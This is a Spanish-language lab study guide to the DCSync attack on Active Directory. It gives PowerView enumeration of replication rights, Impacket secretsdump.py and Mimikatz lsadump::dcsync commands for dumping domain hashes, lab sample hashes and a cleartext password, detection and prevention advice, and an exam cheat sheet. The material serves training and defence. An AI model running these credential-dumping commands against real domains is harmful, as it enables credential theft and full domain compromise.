
## 1. ¿Qué es DCSync?

**DCSync** es una técnica que permite obtener hashes de contraseñas y otros secretos de Active Directory simulando las peticiones de replicación de un controlador de dominio mediante el protocolo **Directory Replication Service Remote Protocol (DRSUAPI)**.

En lugar de extraer directamente el archivo `NTDS.dit`, el atacante solicita al controlador de dominio que replique los datos de las cuentas.

### Permisos necesarios

La cuenta comprometida debe disponer de los permisos de replicación adecuados sobre el dominio:

- `DS-Replication-Get-Changes`
    
- `DS-Replication-Get-Changes-All`
    

En determinados entornos también puede ser relevante `DS-Replication-Get-Changes-In-Filtered-Set`.

Estos permisos suelen estar asignados a grupos privilegiados, como `Domain Admins` y `Enterprise Admins`, pero también pueden concederse a cuentas estándar.

**Objetivo del laboratorio:** aprovechar los privilegios DCSync del usuario `adunn` para extraer credenciales de `INLANEFREIGHT.LOCAL`.

## 2. Enumerar los permisos DCSync con PowerView

### Consultar la información del usuario

```
Get-DomainUser -Identity adunn |
    Select-Object samaccountname,objectsid,memberof,useraccountcontrol |
    Format-List
```

Obtenemos el SID del usuario y consultamos las ACL del objeto de dominio para comprobar sus permisos de replicación.

### Buscar los permisos de replicación

```
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"

Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs |
    Where-Object { $_.ObjectAceType -match 'Replication-Get' } |
    Where-Object { $_.SecurityIdentifier -eq $sid } |
    Select-Object AceQualifier,ObjectDN,ActiveDirectoryRights,SecurityIdentifier,ObjectAceType |
    Format-List
```

Los permisos relevantes que debemos identificar son:

|Permiso|Función|
|---|---|
|`DS-Replication-Get-Changes`|Permite solicitar determinados cambios del directorio.|
|`DS-Replication-Get-Changes-All`|Permite solicitar datos secretos durante la replicación, incluidos los datos necesarios para obtener hashes de contraseñas.|
|`DS-Replication-Get-Changes-In-Filtered-Set`|Está relacionado con la replicación del conjunto de atributos filtrados.|

Si una cuenta no tiene estos permisos, una ACL mal configurada que permita modificar las DACL, por ejemplo mediante `WriteDacl`, podría abrir una vía para concederlos. La posibilidad de hacerlo depende de los permisos efectivos y del objeto afectado.

## 3. Extraer credenciales con Impacket

La herramienta `secretsdump.py` permite realizar el ataque DCSync desde Linux.

### Volcar los hashes y las claves Kerberos

```
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

La herramienta solicitará la contraseña de `adunn` si no se proporciona mediante otro mecanismo de autenticación.

Parámetros importantes:

|Parámetro|Función|
|---|---|
|`-outputfile`|Define el prefijo de los archivos de salida.|
|`-just-dc`|Extrae datos de credenciales del dominio mediante la replicación.|
|`-just-dc-ntlm`|Limita la extracción a los hashes NTLM.|
|`-just-dc-user <USUARIO>`|Limita la extracción a un usuario específico.|
|`-pwd-last-set`|Incluye información sobre la última modificación de contraseña.|
|`-history`|Incluye el historial de hashes disponible.|
|`-user-status`|Incluye información sobre el estado de las cuentas.|

### Archivos generados

Con el prefijo `inlanefreight_hashes`, el laboratorio muestra estos archivos:

```
ls inlanefreight_hashes*
```

```
inlanefreight_hashes.ntds
inlanefreight_hashes.ntds.cleartext
inlanefreight_hashes.ntds.kerberos
```

|Archivo|Contenido|
|---|---|
|`.ntds`|Datos de credenciales, incluidos los hashes NTLM extraídos.|
|`.ntds.kerberos`|Claves Kerberos.|
|`.ntds.cleartext`|Contraseñas recuperadas en texto claro cuando están disponibles mediante cifrado reversible.|

### Formato de los hashes

Una entrada puede tener este formato:

```
dominio\usuario:RID:LMHASH:NTHASH:::
```

Ejemplo del laboratorio:

```
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
```

Campos importantes:

- **RID:** identificador relativo de la cuenta.
    
- **LMHASH:** hash LM; el valor `aad3b435b51404eeaad3b435b51404ee` suele indicar que no hay un hash LM útil almacenado.
    
- **NTHASH:** hash NTLM de la contraseña.
    

El hash NTLM puede servir para auditorías de contraseñas o para autenticación mediante técnicas compatibles, sin necesidad de recuperar previamente la contraseña en texto claro.

## 4. Contraseñas con cifrado reversible

Active Directory dispone de una opción de cuenta denominada **Store password using reversible encryption**.

Aunque se denomine cifrado reversible, esto no significa que la contraseña se almacene literalmente en texto plano. Se conserva de una manera que permite recuperar su valor original, a diferencia del hash NTLM, que no está diseñado para descifrarse.

Si una cuenta tiene esta opción habilitada, `secretsdump.py` puede recuperar su contraseña en texto claro durante la extracción, siempre que disponga de los datos y las claves necesarios.

### Enumerar cuentas con cifrado reversible mediante PowerView

```
Get-DomainUser -Identity * |
    Where-Object { $_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*' } |
    Select-Object samaccountname,useraccountcontrol
```

### Enumerar cuentas mediante el módulo de Active Directory

```
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

El valor `128` corresponde al indicador `ENCRYPTED_TEXT_PWD_ALLOWED`.

En el laboratorio, la cuenta identificada es `proxyagent`.

### Consultar el archivo de contraseñas recuperadas

```
cat inlanefreight_hashes.ntds.cleartext
```

El ejemplo del módulo muestra:

```
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

**Importante:** si se deshabilita esta opción, una contraseña que ya se almacenó mediante cifrado reversible no se convierte automáticamente en un hash unidireccional. Es necesario cambiar la contraseña para que se almacene según la nueva configuración.

## 5. Ejecutar DCSync con Mimikatz desde Windows

Otra opción es utilizar Mimikatz desde un host Windows.

La herramienta debe ejecutarse en un contexto que disponga de los permisos DCSync. En el laboratorio, se utiliza `runas.exe` para iniciar una sesión con las credenciales de `adunn`.

### Iniciar una sesión de red

```
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

Introduce la contraseña cuando se solicite.

**Nota:** `/netonly` utiliza esas credenciales para las conexiones de red. No cambia necesariamente la identidad local que muestran comandos como `whoami`.

### Ejecutar Mimikatz

Desde la nueva sesión de PowerShell:

```
.\mimikatz.exe
```

Dentro de Mimikatz, habilitar el privilegio de depuración:

```
privilege::debug
```

A continuación, solicitar los datos de la cuenta de administrador:

```
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

La salida puede incluir:

- Nombre de la cuenta.
    
- SID.
    
- Fecha del último cambio de contraseña.
    
- Hash NTLM.
    
- Credenciales suplementarias.
    

Ejemplo del laboratorio:

```
SAM Username : administrator
Object Security ID : S-1-5-21-3842939050-3880317879-2865463114-500

Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf
```

También se podría consultar la cuenta `krbtgt`. El módulo menciona el uso de su hash para crear un Golden Ticket, pero ese procedimiento queda fuera del alcance de esta sección.

## 6. DCSync: flujo de ataque

```
1. Obtener control de una cuenta de dominio
              |
              v
2. Enumerar las ACL del dominio
              |
              v
3. Confirmar los permisos de replicación
   - DS-Replication-Get-Changes
   - DS-Replication-Get-Changes-All
              |
              v
4. Ejecutar DCSync
   - secretsdump.py (Linux)
   - Mimikatz (Windows)
              |
              v
5. Obtener hashes NTLM y claves Kerberos
              |
              v
6. Analizar las credenciales extraídas
   - Hashes de cuentas privilegiadas
   - Historial de hashes, si está disponible
   - Contraseñas recuperables mediante cifrado reversible
```

## 7. Detección y prevención

### Detección

- Auditar los permisos de replicación asignados al objeto del dominio.
    
- Investigar cuentas no administrativas con `DS-Replication-Get-Changes` y `DS-Replication-Get-Changes-All`.
    
- Revisar eventos de seguridad relacionados con solicitudes de replicación y cambios de ACL, teniendo en cuenta la configuración de auditoría.
    
- Vigilar cambios inesperados en las DACL de los objetos de dominio.
    
- Revisar las cuentas que tengan habilitado el cifrado reversible de contraseñas.
    

### Prevención

- Conceder permisos DCSync únicamente a las cuentas que realmente los necesiten.
    
- Revisar periódicamente las ACL del dominio y las rutas de escalada de privilegios.
    
- Eliminar permisos de replicación innecesarios.
    
- Evitar habilitar el almacenamiento de contraseñas con cifrado reversible salvo que exista una necesidad justificada.
    
- Proteger las cuentas privilegiadas y controlar el acceso a los controladores de dominio.

## 8. Chuleta rápida para el examen

|Objetivo|Comando o herramienta|
|---|---|
|Enumerar un usuario|`Get-DomainUser -Identity adunn`|
|Consultar ACL de replicación|`Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs`|
|Extraer credenciales del dominio desde Linux|`secretsdump.py -just-dc INLANEFREIGHT/adunn@172.16.5.5`|
|Extraer solo hashes NTLM|`secretsdump.py -just-dc-ntlm INLANEFREIGHT/adunn@172.16.5.5`|
|Extraer una cuenta concreta|`secretsdump.py -just-dc-user administrator INLANEFREIGHT/adunn@172.16.5.5`|
|Buscar cuentas con cifrado reversible|`Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl`|
|Iniciar PowerShell con credenciales de red|`runas /netonly /user:INLANEFREIGHT\adunn powershell`|
|Ejecutar DCSync con Mimikatz|`lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`|

### Lo que debes recordar

1. **DCSync no requiere ejecutar código directamente en el controlador de dominio:** utiliza el protocolo de replicación para solicitar los datos.
    
2. **Los permisos de replicación son la clave:** comprometer una cuenta con los derechos adecuados puede permitir extraer credenciales de todo el dominio.
    
3. `**secretsdump.py**` **y Mimikatz** son dos herramientas habituales para realizar el ataque.
    
4. `**-just-dc-user**` permite limitar la extracción a una cuenta concreta.
    
5. **El cifrado reversible es un riesgo adicional:** determinadas contraseñas pueden recuperarse en texto claro.
    
6. **Un usuario estándar también puede tener privilegios DCSync** si se le han asignado mediante una ACL.
    
7. **DCSync puede conducir al compromiso completo del dominio**, dependiendo de las credenciales obtenidas y de los privilegios asociados.
